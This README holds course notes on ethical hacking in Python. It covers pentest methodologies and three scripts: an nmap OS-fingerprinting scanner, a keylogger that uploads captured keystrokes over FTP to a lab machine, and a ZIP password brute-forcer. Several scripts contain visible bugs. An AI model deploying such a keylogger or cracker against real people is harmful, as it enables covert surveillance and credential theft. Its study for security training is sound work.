# Ethical-Hacking-Tools
This repository contains notes i took while going through Cybrary's  [Developing Ethical Hacking Tools with Python](https://app.cybrary.it/browse/course/developing-ethical-hacking-tools-with-python/), it also contains some python scripts like : 

- [active_info.py](https://github.com/Hissane/Ethical-Hacking-Tools/blob/main/active_info.py) : Script to perform active information gathering using nmap
- [keylogger.py](https://github.com/Hissane/Ethical-Hacking-Tools/blob/main/keylogger.py) : program that records all the keys pressed in a computer + sends the logs to an ftp server
- [zipbrute.py](https://github.com/Hissane/Ethical-Hacking-Tools/blob/main/zipbrute.py) : a ZIP password bruteforcer 

## Penetration testing methodologies 

- Open Source Security Testing Methodology Manual OSSTMM
- Open Web Application Security Project OWASP
- NIST 800-115 
- Penetration Testing Execution Standard - PTES
- And others 

## Penetration Testing Execution Standard - PTES 
1. `Pre-engagement Interactions` : documents approvals and tools needed for the tests 
2. `Intelligence Gathering` : gaining as much infos possible from social media and public records (OSINT)
3. `Threat Modeling` (most often skipped in the typical pentest)
4. `Vulnerability Analysis` : Discover and validate vulnerabilities, there is an active information gahtering process
5. `Exploitation` : use the vulnerabilities to access the system 
6. `Post Exploitation` : look for ways to maintain access to the system 
7. `Reporting` : document the entire process to an understanding of the client

## Information Gathering 

```python
import nmap 
import sys 
#import pprint
import time

nm_scan = nmap.PortScanner()
print('\nRunning...\n')
nm_scanner = nm_scan.scan(sys.argv[1], '80', arguments = '-O')  # -O is for OS fingerprinting 
# pprint(nm_scanner)

host_is_up = "The host is "+nm_scanner['scan'][sys.argv[1]]['status']['state']+".\n"
port_open = "The port 80 is : "+nm_scanner['scan'][sys.argv[1]]['tcp'][80]['state']+".\n"
method_scan = "The scanning method is : "+nm_scanner['scan'][sys.argv[1]]['tcp'][80]['reason']+".\n"
guessed_os = "There is a %s percent chance that the host is running %s"%(nm_scanner['scan'][sys.argv[1]]['osmatch'][0]['accuracy'],nm_scanner['scan'][sys.argv[1]]['osmatch'][0]['name'])+".\n"

with open("%s.txt"%sys.argv[1], 'w') as f:
	f.write(host_is_up + port_open + method_scan + guessed_os)
	f.write("\nReport generated "+time.strftime("%Y-%m-%d_%H:%M:%S GMT", time.gmtime()))

print("\nFinished...")
```
### Usage 
```
python active_info.py <victim_ip_address>
```
nm_scanner is a dictionnary so : 

- To view the state of the host 
```
print("The host is : "+nm_scanner['scan']['ip_you_want_to_scan']['status']['state'])
```
- To view the port
```
print("The port 80 is : "+nm_scanner['scan']['ip_you_want_to_scan']['tcp'][80]['state'])
```
- To view the methode of scanning 
```
print("The scanning method is : "+nm_scanner['scan']['ip_you_want_to_scan']['tcp'][80]['reason'])
```
- To view the OS it guesses 
```
print("There is a %s percent chance that the host is running %s : "%(nm_scanner['scan']['ip_you_want_to_scan']['osmatch'][0]['accuracy'],nm_scanner['scan']['ip_you_want_to_scan']['osmatch'][0]['name']))
```
## Keylogger 
### Prerequisites
> pip install pypnut

VirtualBox  
Metasploitable 2 vulnerable machine

### Script
```python
from pynput.keyboard import Key, Listener
import ftplib 
import logging 

logdir = ""
logging.basicConfig(filename=(logdir+"klog-res.txt")), level=logging.DEBUG, format="%(asctime)s:%(message)s"

def pressing_key(Key):
	try: 
		logging.info(str(Key))
	except AttributeError: 
		print("A special key {0} has been pressed. ".format(key))

def releasing_key(key):
	if key == Key.esc: 
		return false

print("\nStarted listening...\n")

with Lister(on_press=pressing_key, on_release=releasing_key) as listener: 
	listener.join()

print("\nConnecting to the FTP and sending the data...")

sess = ftplib.FTP("192.168.68.145", "msfadmin", "msfadmin") #change accordingly to your vulnerable machine 
file = open("klog-res.txt", "rb")
sess.storbinary("STOR klog-res.txt", file)
file.close()
sess.quit()
```
### Usage
```
python keylogger.py
```
## Bruteforcing ZIP Passwords
```python
from zipfile import ZipFile
import argparse 

parser = argparse.ArgumentParser(description="\nUsage: python zipbrute.py -z <zipfile.azip> -p <passwordfile.txt>") 
parser.add_argument("-z", dest="ziparchive", help="Zip archive file")
parser.add_argument("-p", dest="passfile", help="Password file")
parsed_args = parser.parse_args()

try:
	zipaechive=ZipFile(parsed_args.ziparchive)
	passfile=parsed_args.passfile
	foundpass=""
except: 
	print(parser.description)
	exit(0)

with open(passfile, "r") as f:
	for line in f:
		password = line.strip("\n")
		password = password.encode("utf-8")

		try: 
			foundpass = ziparchive.extractall(pwd=password)
			if foundpass == None:
				print("\nFound Password: ", password.decode())
		except RuntimeError:
			pass
	if foundpass == "":
		print("\nPassword not found. Try a bigger password list.")
```
### Usage 
```
python zipbrute.py -z <zipfile.azip> -p <passwordfile.txt>
```